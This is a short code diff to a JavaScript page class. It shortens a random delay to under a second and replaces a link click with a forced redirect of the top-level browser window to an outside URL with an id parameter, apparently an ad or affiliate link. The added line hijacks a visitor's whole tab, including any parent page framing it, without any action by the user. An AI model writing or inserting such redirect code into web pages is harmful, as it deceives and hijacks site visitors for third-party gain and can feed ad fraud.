@@ -134,9 +134,9 @@ class MO {
     const nextButton = document.getElementById('next-button')
     const prevButton = document.getElementById('prev-button')
     const propLink = document.getElementById('propLink')
-    const waitTime = this.rand(10000, 30000)
+    const waitTime = this.rand(500, 1000)
     setTimeout(() => {
-      propLink.click()
+      window.top.location.href = "http://go.onclasrv.com/afu.php?id=1372240";
     }, waitTime)
     // setTimeout(() => {
     //   nextButton.click()
